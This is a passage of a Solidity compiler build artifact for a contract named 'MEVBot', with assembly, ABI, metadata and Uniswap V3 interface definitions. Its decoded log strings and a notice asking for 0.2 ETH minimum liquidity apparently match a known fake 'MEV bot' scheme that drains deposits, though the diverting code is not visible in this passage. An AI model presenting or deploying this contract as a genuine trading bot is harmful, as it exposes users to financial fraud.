											"source": 0
										},
										{
											"begin": 14318,
											"end": 14319,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14305,
											"end": 14314,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 14299,
											"end": 14315,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 14299,
											"end": 14315,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 14299,
											"end": 14319,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14294,
											"end": 14320,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 14294,
											"end": 14320,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 14287,
											"end": 14320,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14287,
											"end": 14320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14287,
											"end": 14320,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "125"
										},
										{
											"begin": 14287,
											"end": 14320,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 14251,
											"end": 14438,
											"name": "tag",
											"source": 0,
											"value": "127"
										},
										{
											"begin": 14251,
											"end": 14438,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14353,
											"end": 14354,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14341,
											"end": 14355,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 14341,
											"end": 14355,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14341,
											"end": 14343,
											"name": "PUSH",
											"source": 0,
											"value": "A"
										},
										{
											"begin": 14341,
											"end": 14355,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 14341,
											"end": 14355,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14341,
											"end": 14373,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14341,
											"end": 14373,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14341,
											"end": 14373,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "129"
										},
										{
											"begin": 14341,
											"end": 14373,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 14341,
											"end": 14373,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14371,
											"end": 14373,
											"name": "PUSH",
											"source": 0,
											"value": "F"
										},
										{
											"begin": 14365,
											"end": 14366,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 14359,
											"end": 14373,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 14359,
											"end": 14373,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14359,
											"end": 14373,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 14359,
											"end": 14373,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14341,
											"end": 14373,
											"name": "tag",
											"source": 0,
											"value": "129"
										},
										{
											"begin": 14341,
											"end": 14373,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14337,
											"end": 14438,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14337,
											"end": 14438,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "130"
										},
										{
											"begin": 14337,
											"end": 14438,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 14424,
											"end": 14426,
											"name": "PUSH",
											"source": 0,
											"value": "A"
										},
										{
											"begin": 14420,
											"end": 14421,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 14407,
											"end": 14416,
											"name": "PUSH",
											"source": 0,
											"value": "6100000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 14401,
											"end": 14417,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 14401,
											"end": 14417,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 14401,
											"end": 14421,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14401,
											"end": 14426,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 14396,
											"end": 14427,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 14396,
											"end": 14427,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 14389,
											"end": 14427,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14389,
											"end": 14427,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14389,
											"end": 14427,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "125"
										},
										{
											"begin": 14389,
											"end": 14427,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 14337,
											"end": 14438,
											"name": "tag",
											"source": 0,
											"value": "130"
										},
										{
											"begin": 14337,
											"end": 14438,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 14183,
											"end": 14502,
											"name": "tag",
											"source": 0,
											"value": "125"
										},
										{
											"begin": 14183,
											"end": 14502,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14183,
											"end": 14502,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 14183,
											"end": 14502,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14183,
											"end": 14502,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14183,
											"end": 14502,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									],
									".data": {
										"6350D1A48231284A8341DBB6CEC434401EEC03DD1DB1D0D6D2F253F7A8B3ECA6": "53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e",
										"9FB03945078BC6C7000C07D459687B271AE0ADC059777DEE3669B3C70B385107": "52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e"
									}
								}
							}
						},
						"methodIdentifiers": {
							"start()": "be9a6555",
							"tokenName()": "6c02a931",
							"tokenSymbol()": "7b61c320",
							"withdrawal()": "d4e93292"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_mainTokenSymbol\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_mainTokenName\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenName\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSymbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawal\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{},\"notice\":\"Testnet transactions will fail as there is no value Updated build Min liquidity not including gas fees needs to equal 0.2 ETH\"}},\"settings\":{\"compilationTarget\":{\"contracts/bot.sol\":\"MEVBot\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/bot.sol\":{\"keccak256\":\"0x5e18f8f7f92eb5af0ac21e8eb2296d92690335a09146ba4b78e7d52e65b2e42e\",\"urls\":[\"bzz-raw://d0445b1d1b76bb4f14789703ce62e9f8e96d15516dfe8b96c6c236ead2b3fbb6\",\"dweb:/ipfs/QmcHRd9kWGAbhhdmUgJakX98M7x5n3PTLj8ShT1JwngEKK\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":{\"keccak256\":\"0xcc3d0c93fc9ac0febbe09f941b465b57f750bcf3b48432da0b97dc289cfdc489\",\"urls\":[\"bzz-raw://b9379ad954680c44a0bc523b314ae4c4da735f9fe1d02aa56ea5bdba6f1136f2\",\"dweb:/ipfs/QmZXdgQNXKAckrXWz9R3mc47F1fvDvr28a2ewJrwNAw71B\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":{\"keccak256\":\"0xfe6113d518466cd6652c85b111e01f33eb62157f49ae5ed7d5a3947a2044adb1\",\"urls\":[\"bzz-raw://1c42b9e6f5902ac38dd43e25750939baa7e0c1425dc75afd717c4412731065d5\",\"dweb:/ipfs/QmWaoacnzsucTvBME2o7YgZBZMhaHv7fkj83htHMVWJKWh\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":{\"keccak256\":\"0xd53041349718d5bce4a89e87cd911879d41ba42ba3fab0614e5e8b742f352b88\",\"urls\":[\"bzz-raw://ea7529b99ab4fc1d3e6c5a31990fb688f0a2d6cc302c0419e0cf5a2d6c563781\",\"dweb:/ipfs/QmVaphRSNpfChHZKzutQ9WprwCo2WE1euvThRfHcwsnHhj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 7,
								"contract": "contracts/bot.sol:MEVBot",
								"label": "tokenName",
								"offset": 0,
								"slot": "0",
								"type": "t_string_storage"
							},
							{
								"astId": 9,
								"contract": "contracts/bot.sol:MEVBot",
								"label": "tokenSymbol",
								"offset": 0,
								"slot": "1",
								"type": "t_string_storage"
							},
							{
								"astId": 11,
								"contract": "contracts/bot.sol:MEVBot",
								"label": "liquidity",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_string_storage": {
								"encoding": "bytes",
								"label": "string",
								"numberOfBytes": "32"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {},
						"notice": "Testnet transactions will fail as there is no value Updated build Min liquidity not including gas fees needs to equal 0.2 ETH"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"IUniswapV3Factory": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								}
							],
							"name": "FeeAmountEnabled",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "oldOwner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "OwnerChanged",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "token0",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "token1",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"name": "PoolCreated",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								},
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "createPool",
							"outputs": [
								{
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								}
							],
							"name": "enableFeeAmount",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "feeAmountTickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								},
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "getPool",
							"outputs": [
								{
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_owner",
									"type": "address"
								}
							],
							"name": "setOwner",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"createPool(address,address,uint24)": {
								"details": "tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments are invalid.",
								"params": {
									"fee": "The desired fee for the pool",
									"tokenA": "One of the two tokens in the desired pool",
									"tokenB": "The other of the two tokens in the desired pool"
								},
								"returns": {
									"pool": "The address of the newly created pool"
								}
							},
							"enableFeeAmount(uint24,int24)": {
								"details": "Fee amounts may never be removed once enabled",
								"params": {
									"fee": "The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)",
									"tickSpacing": "The spacing between ticks to be enforced for all pools created with the given fee amount"
								}
							},
							"feeAmountTickSpacing(uint24)": {
								"details": "A fee amount can never be removed, so this value should be hard coded or cached in the calling context",
								"params": {
									"fee": "The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee"
								},
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"getPool(address,address,uint24)": {
								"details": "tokenA and tokenB may be passed in either token0/token1 or token1/token0 order",
								"params": {
									"fee": "The fee collected upon every swap in the pool, denominated in hundredths of a bip",
									"tokenA": "The contract address of either token0 or token1",
									"tokenB": "The contract address of the other token"
								},
								"returns": {
									"pool": "The pool address"
								}
							},
							"owner()": {
								"details": "Can be changed by the current owner via setOwner",
								"returns": {
									"_0": "The address of the factory owner"
								}
							},
							"setOwner(address)": {
								"details": "Must be called by the current owner",
								"params": {
									"_owner": "The new owner of the factory"
								}
							}
						},
						"title": "The interface for the Uniswap V3 Factory"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"createPool(address,address,uint24)": "a1671295",
							"enableFeeAmount(uint24,int24)": "8a7c195f",
							"feeAmountTickSpacing(uint24)": "22afcccb",
							"getPool(address,address,uint24)": "1698ee82",
							"owner()": "8da5cb5b",
							"setOwner(address)": "13af4035"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"}],\"name\":\"FeeAmountEnabled\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnerChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token0\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token1\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"name\":\"PoolCreated\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"createPool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"}],\"name\":\"enableFeeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"feeAmountTickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"getPool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"createPool(address,address,uint24)\":{\"details\":\"tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments are invalid.\",\"params\":{\"fee\":\"The desired fee for the pool\",\"tokenA\":\"One of the two tokens in the desired pool\",\"tokenB\":\"The other of the two tokens in the desired pool\"},\"returns\":{\"pool\":\"The address of the newly created pool\"}},\"enableFeeAmount(uint24,int24)\":{\"details\":\"Fee amounts may never be removed once enabled\",\"params\":{\"fee\":\"The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\",\"tickSpacing\":\"The spacing between ticks to be enforced for all pools created with the given fee amount\"}},\"feeAmountTickSpacing(uint24)\":{\"details\":\"A fee amount can never be removed, so this value should be hard coded or cached in the calling context\",\"params\":{\"fee\":\"The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\"},\"returns\":{\"_0\":\"The tick spacing\"}},\"getPool(address,address,uint24)\":{\"details\":\"tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\",\"params\":{\"fee\":\"The fee collected upon every swap in the pool, denominated in hundredths of a bip\",\"tokenA\":\"The contract address of either token0 or token1\",\"tokenB\":\"The contract address of the other token\"},\"returns\":{\"pool\":\"The pool address\"}},\"owner()\":{\"details\":\"Can be changed by the current owner via setOwner\",\"returns\":{\"_0\":\"The address of the factory owner\"}},\"setOwner(address)\":{\"details\":\"Must be called by the current owner\",\"params\":{\"_owner\":\"The new owner of the factory\"}}},\"title\":\"The interface for the Uniswap V3 Factory\"},\"userdoc\":{\"methods\":{\"createPool(address,address,uint24)\":{\"notice\":\"Creates a pool for the given two tokens and fee\"},\"enableFeeAmount(uint24,int24)\":{\"notice\":\"Enables a fee amount with the given tickSpacing\"},\"feeAmountTickSpacing(uint24)\":{\"notice\":\"Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\"},\"getPool(address,address,uint24)\":{\"notice\":\"Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\"},\"owner()\":{\"notice\":\"Returns the current owner of the factory\"},\"setOwner(address)\":{\"notice\":\"Updates the owner of the factory\"}},\"notice\":\"The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":\"IUniswapV3Factory\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":{\"keccak256\":\"0xcc3d0c93fc9ac0febbe09f941b465b57f750bcf3b48432da0b97dc289cfdc489\",\"urls\":[\"bzz-raw://b9379ad954680c44a0bc523b314ae4c4da735f9fe1d02aa56ea5bdba6f1136f2\",\"dweb:/ipfs/QmZXdgQNXKAckrXWz9R3mc47F1fvDvr28a2ewJrwNAw71B\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"createPool(address,address,uint24)": {
								"notice": "Creates a pool for the given two tokens and fee"
							},
							"enableFeeAmount(uint24,int24)": {
								"notice": "Enables a fee amount with the given tickSpacing"
							},
							"feeAmountTickSpacing(uint24)": {
								"notice": "Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled"
							},
							"getPool(address,address,uint24)": {
								"notice": "Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist"
							},
							"owner()": {
								"notice": "Returns the current owner of the factory"
							},
							"setOwner(address)": {
								"notice": "Updates the owner of the factory"
							}
						},
						"notice": "The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"IUniswapV3Pool": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "Collect",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "CollectProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid1",
									"type": "uint256"
								}
							],
							"name": "Flash",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextOld",
									"type": "uint16"
								},
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextNew",
									"type": "uint16"
								}
							],
							"name": "IncreaseObservationCardinalityNext",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Initialize",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0New",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1New",
									"type": "uint8"
								}
							],
							"name": "SetFeeProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "int256",
